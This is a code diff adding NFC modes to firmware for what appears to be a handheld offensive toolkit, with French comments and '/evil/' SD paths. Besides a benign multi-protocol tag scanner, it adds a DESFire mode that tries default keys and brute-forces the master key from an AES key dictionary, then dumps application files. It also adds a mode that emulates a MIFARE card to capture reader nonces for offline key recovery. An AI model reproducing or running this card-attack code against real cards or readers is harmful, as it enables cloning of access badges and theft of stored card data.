+                        delay(1600);
+                        nfc_activate();      // leave tag in a usable state
+                        need_draw = true;
+                    }
+                    delay(10);
+                }
+            }
+            ul_done:;
+        }
+
+        // ── Mode 9: ISO15693 / FeliCa / ISO14443-B scan ──
+        // Additive: switches the ST25R3916 to NFC-B / NFC-F, polls, then always
+        // restores the NFC-A reader (nfcv_restore_isoa + full nfc_close/open).
+        if (mode == 9) {
+            bool rescan = true;
+            while (true) {
+                if (rescan) {
+                    rescan = false;
+                    sp.fillScreen(TFT_BLACK);
+                    sp.fillRect(0, 0, W, 14, 0x0841);
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("ISO-V/F/B Scan");
+                    sp.setTextColor(TFT_YELLOW, TFT_BLACK); sp.setCursor(6, 22); sp.print("Polling B / F / V...");
+                    if (use_sprite) sprite->pushSprite(0, 0);
+
+                    // ISO14443-B (REQB)
+                    uint8_t pupi[4]; uint8_t atqb[16]; int atqb_len = 0;
+                    int rb = nfcv_isob_poll(pupi, atqb, sizeof(atqb), &atqb_len);
+                    // FeliCa (Polling)
+                    uint8_t idm[8], pmm[8];
+                    int rf = nfcv_felica_poll(idm, pmm);
+                    // ISO15693 (deferred)
+                    uint8_t vuid[8];
+                    int rv = nfcv_iso15693_inventory(vuid);
+
+                    sp.fillScreen(TFT_BLACK);
+                    sp.fillRect(0, 0, W, 14, 0x0841);
+                    sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("ISO-V/F/B Scan");
+                    int y = 20;
+                    // ISO-B
+                    sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(4, y); sp.print("ISO-B:");
+                    sp.setTextColor(rb == NFCV_FOUND ? TFT_GREEN : TFT_DARKGREY, TFT_BLACK);
+                    sp.setCursor(58, y);
+                    if (rb == NFCV_FOUND) { sp.print("PUPI "); for (int i=0;i<4;i++) sp.printf("%02X", pupi[i]); }
+                    else sp.print("none");
+                    y += 16;
+                    // FeliCa
+                    sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(4, y); sp.print("FeliCa:");
+                    sp.setTextColor(rf == NFCV_FOUND ? TFT_GREEN : TFT_DARKGREY, TFT_BLACK);
+                    sp.setCursor(58, y);
+                    if (rf == NFCV_FOUND) { sp.print("IDm "); for (int i=0;i<8;i++) sp.printf("%02X", idm[i]); }
+                    else sp.print("none");
+                    y += 16;
+                    if (rf == NFCV_FOUND) {
+                        sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(58, y); sp.print("PMm ");
+                        for (int i=0;i<8;i++) sp.printf("%02X", pmm[i]); y += 16;
+                    }
+                    // ISO15693
+                    sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(4, y); sp.print("ISO-V:");
+                    sp.setTextColor(TFT_ORANGE, TFT_BLACK); sp.setCursor(58, y);
+                    sp.print(rv == NFCV_PENDING ? "deferred (stream mode)" : "none");
+                    y += 16;
+
+                    sp.fillRect(0, H-14, W, 14, 0x0841);
+                    sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("ENT=rescan BACK=menu");
+                    if (use_sprite) sprite->pushSprite(0, 0);
+
+                    // Belt-and-suspenders: full re-init of the NFC-A reader.
+                    nfc_close(); nfc_open();
+                }
+                M5.update(); cardUpdate();
+                if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+                if (kp(KEY_ENTER)) { keyRelease(); rescan = true; }
+                delay(10);
+            }
+        }
+
+        // ── Mode 10: DESFire (énumération + auth DES/3DES/AES) ──
+        if (mode == 10) {
+            sp.fillScreen(TFT_BLACK);
+            sp.fillRect(0, 0, W, 14, 0x0841);
+            sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("DESFire");
+            sp.setTextColor(TFT_YELLOW, TFT_BLACK);
+            sp.setCursor(20, 55); sp.print("Approche une carte...");
+            sp.fillRect(0, H-14, W, 14, 0x0841);
+            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12); sp.print("BACK=menu");
+            if (use_sprite) sprite->pushSprite(0, 0);
+
+            std::vector<String> lines;
+            bool got = false;
+            while (!got) {
+                M5.update(); cardUpdate();
+                if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+
+                NfcCardInfo card = nfc_activate();
+                if (!card.valid || !(card.sak & 0x20)) { delay(80); continue; }
+
+                // RATS -> ISO-DEP
+                nfc_i_block_num = 0;
+                uint8_t rats[2] = {0xE0, 0x80}; int rl = 0;
+                uint8_t* ats = nfc_transceive(rats, 2, &rl, 50);
+                if (!ats || rl <= 0) { delay(120); continue; }
+
+                // GET_VERSION
+                uint8_t ver[32]; int vl = df_get_version(ver);
+                if (vl < 7) {   // pas DESFire (ou pas de réponse native)
+                    lines.push_back("Pas une DESFire ?");
+                    lines.push_back("GET_VERSION KO");
+                    got = true; break;
+                }
+                got = true;
+
+                char b[48];
+                lines.push_back(String("== DESFire =="));
+                snprintf(b, sizeof(b), "HW v%d.%d proto %02X", ver[3], ver[4], ver[6]);
+                lines.push_back(b);
+                { int code = ver[5]; int approx = 1 << (code >> 1);
+                  snprintf(b, sizeof(b), "Storage ~%dB (%02X)", approx, code); lines.push_back(b); }
+                if (vl >= 21) {
+                    String uid = "UID ";
+                    for (int i = 14; i < 21; i++) { snprintf(b, sizeof(b), "%02X", ver[i]); uid += b; }
+                    lines.push_back(uid);
+                }
+                if (vl >= 28) {
+                    snprintf(b, sizeof(b), "Prod semaine %02X/%02X", ver[26], ver[27]);
+                    lines.push_back(b);
+                }
+
+                // Master app (000000) : key settings + auth zero key + dict AES
+                uint8_t aid0[3] = {0,0,0};
+                df_select_app(aid0);
+                { uint8_t ks[8]; int ksl = 0;
+                  int st = df_cmd(DF_CMD_GET_KEY_SETTINGS, NULL, 0, ks, &ksl, 200);
+                  if (st == DF_ST_OK && ksl >= 2) {
+                      snprintf(b, sizeof(b), "PICC keyset %02X nk=%d", ks[0], ks[1] & 0x0F);
+                      lines.push_back(b);
+                  } }
+                bool m_aes = df_auth_aes(0, DF_KEY_ZERO16, NULL);
+                bool m_des = false;
+                if (!m_aes) { df_select_app(aid0); m_des = df_auth_des(0, DF_KEY_ZERO8, 8); }
+                lines.push_back(String("PICC key0 zero: ") +
+                                (m_aes ? "AES OK" : (m_des ? "DES OK" : "non")));
+
+                // Dictionnaire SD /evil/nfc/desfire_keys.txt (AES) sur PICC key0
+                if (!m_aes) {
+                    File kf = SD.open("/evil/nfc/desfire_keys.txt", FILE_READ);
+                    if (kf) {
+                        int tried = 0;
+                        while (kf.available() && tried < 64 && !m_aes) {
+                            String ln = kf.readStringUntil('\n'); ln.trim();
+                            if (ln.length() < 32) continue;
+                            uint8_t key[16];
+                            for (int i = 0; i < 16; i++)
+                                key[i] = (uint8_t)strtol(ln.substring(i*2, i*2+2).c_str(), NULL, 16);
+                            tried++;
+                            df_select_app(aid0);
+                            if (df_auth_aes(0, key, NULL)) {
+                                m_aes = true;
+                                lines.push_back(String("PICC key0 DICT AES OK (#") + tried + ")");
+                            }
+                        }
+                        kf.close();
+                        if (!m_aes) lines.push_back(String("Dict AES: ") + tried + " essais, non");
+                    }
+                }
+
+                // Applications
+                uint8_t aids[3*28]; int napp = df_get_app_ids(aids, sizeof(aids));
+                if (napp < 0) { lines.push_back("GET_APP_IDS KO"); }
+                else {
+                    snprintf(b, sizeof(b), "-- %d application(s) --", napp);
+                    lines.push_back(b);
+                    for (int a = 0; a < napp && a < 12; a++) {
+                        uint8_t* aid = aids + a*3;
+                        snprintf(b, sizeof(b), "AID %02X%02X%02X", aid[2], aid[1], aid[0]);
+                        lines.push_back(b);
+                        if (df_select_app(aid) != DF_ST_OK) { lines.push_back("  select KO"); continue; }
+                        // auth zero key sur cette app (key0)
+                        bool a_aes = df_auth_aes(0, DF_KEY_ZERO16, NULL);
+                        if (a_aes) lines.push_back("  key0 zero: AES OK");
+                        df_select_app(aid);
+                        uint8_t fids[32]; int nf = df_get_file_ids(fids, sizeof(fids));
+                        if (nf < 0) { lines.push_back("  GetFileIDs KO"); continue; }
+                        snprintf(b, sizeof(b), "  %d fichier(s)", nf); lines.push_back(b);
+                        for (int f = 0; f < nf && f < 16; f++) {
+                            uint8_t fs[24]; int fsl = df_get_file_settings(fids[f], fs, sizeof(fs));
+                            if (fsl >= 2) {
+                                snprintf(b, sizeof(b), "  f%02X type%d cm%d", fids[f], fs[0], fs[1] & 3);
+                                lines.push_back(b);
+                                // Lecture du CONTENU selon le type (droits permettant ; sinon "denied")
+                                uint8_t fdata[32];
+                                if (fs[0] == 0 || fs[0] == 1) {          // data standard/backup
+                                    uint32_t sz = (uint32_t)fs[4] | ((uint32_t)fs[5] << 8) | ((uint32_t)fs[6] << 16);
+                                    uint32_t rl = sz < 24 ? sz : 24; if (rl == 0) rl = 16;
+                                    int rd = df_read_data(fids[f], 0, rl, fdata, sizeof(fdata));
+                                    if (rd > 0) {
+                                        int pos = snprintf(b, sizeof(b), "   =");
+                                        for (int k = 0; k < rd && k < 10; k++) pos += snprintf(b + pos, sizeof(b) - pos, "%02X", fdata[k]);
+                                        lines.push_back(b);
+                                    } else lines.push_back("   (read denied)");
+                                } else if (fs[0] == 2) {                 // value
+                                    int32_t v;
+                                    if (df_get_value(fids[f], &v) == 0) { snprintf(b, sizeof(b), "   value=%ld", (long)v); lines.push_back(b); }
+                                    else lines.push_back("   (value denied)");
+                                } else if (fs[0] == 3 || fs[0] == 4) {   // record linear/cyclic
+                                    int rd = df_read_records(fids[f], 0, 1, fdata, sizeof(fdata));
+                                    if (rd > 0) {
+                                        int pos = snprintf(b, sizeof(b), "   rec=");
+                                        for (int k = 0; k < rd && k < 10; k++) pos += snprintf(b + pos, sizeof(b) - pos, "%02X", fdata[k]);
+                                        lines.push_back(b);
+                                    } else lines.push_back("   (rec denied)");
+                                }
+                            } else {
+                                snprintf(b, sizeof(b), "  f%02X (settings KO)", fids[f]);
+                                lines.push_back(b);
+                            }
+                        }
+                    }
+                }
+                Serial.printf("[DESFire] rapport %d lignes\n", (int)lines.size());
+            }
+
+            // Viewer scrollable (;=haut .=bas, BACK=menu)
+            if (got && !lines.empty()) {
+                int top = 0;
+                const int lineH = 10, listY = 16;
+                int vis = (H - listY - 14) / lineH;
+                bool draw = true;
+                while (true) {
+                    M5.update(); cardUpdate();
+                    if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+                    if (kp(';')) { if (top > 0) top--; draw = true; delay(90); }
+                    if (kp('.')) { if (top < (int)lines.size() - vis) top++; draw = true; delay(90); }
+                    if (draw) {
+                        draw = false;
+                        sp.fillScreen(TFT_BLACK);
+                        sp.fillRect(0, 0, W, 14, 0x0841);
+                        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("DESFire dump");
+                        sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                        for (int i = 0; i < vis && top + i < (int)lines.size(); i++) {
+                            sp.setCursor(2, listY + i*lineH);
+                            sp.print(lines[top + i]);
+                        }
+                        sp.fillRect(0, H-14, W, 14, 0x0841);
+                        sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(4, H-12);
+                        sp.print(";/. scroll  BACK=menu");
+                        if (use_sprite) sprite->pushSprite(0, 0);
+                    }
+                    delay(4);
+                }
+            }
+        }
+
+        // ── Mode 11: mfkey (MIFARE) — attaque complete : emule la carte, capture les
+        //    nonces chiffres du lecteur -> /evil/mfkey_nonces.txt (resolution offline
+        //    tools/mfkey_solve). Item dedie, distinct du Relay/Emul. ──
+        if (mode == 11) {
+            nfc_mfemul_ui();
         }
 
     } // end while(true) NFC sub-menu loop
